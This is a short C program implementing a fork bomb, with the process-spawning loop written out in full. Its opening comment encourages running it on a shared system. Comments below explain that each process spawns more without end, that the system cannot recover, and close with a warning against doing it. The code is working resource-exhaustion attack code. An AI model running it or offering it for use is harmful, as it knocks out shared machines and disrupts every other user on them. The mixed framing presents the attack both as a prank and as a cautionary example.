/* Cool kids run this program on a shared system. */

#include <unistd.h>

int main(void) {
  while (1) { fork(); }
}


//There is no check for children and parent
//one process will create another process, and the new process
//will create a new process. Then there will be a bomb
//infinity recursive loop
//There is no way to recover. and you can not manipulate it. 
//you create so many processes. 
//This is non recovery. Do not do this.